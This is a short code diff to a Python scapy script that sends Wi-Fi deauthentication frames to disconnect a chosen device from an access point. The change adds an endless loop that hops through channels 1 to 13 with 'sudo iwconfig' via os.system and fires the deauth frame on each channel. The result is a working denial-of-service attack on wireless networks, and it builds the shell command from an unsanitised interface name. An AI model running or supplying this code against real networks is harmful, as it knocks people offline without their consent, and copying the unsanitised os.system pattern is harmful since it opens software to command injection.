@@ -4,6 +4,7 @@ from scapy.all import (
   Dot11Deauth, # For creating deauth frame
   sendp        # for sending packets
 )
+import os
 
 # input -> 
 # 1.choosen interface 
@@ -19,4 +20,8 @@ def deautenticate_user(iface: str, bssid: str, target_mac: str):
   #The inter(framegap - IFG) is a sleep -we need time to build our packet 
   #we used verbos= 0 to disable printing of sendp in console
   while True:
-    sendp(frame, iface=iface, inter=0.100 , verbose = 0)
+    for ch in range (1,14):
+        c = str(ch)
+        cmd = "sudo iwconfig "+iface+" channel "+ c
+        os.system(cmd)
+        sendp(frame, iface=iface, inter=0.100 , verbose = 0)
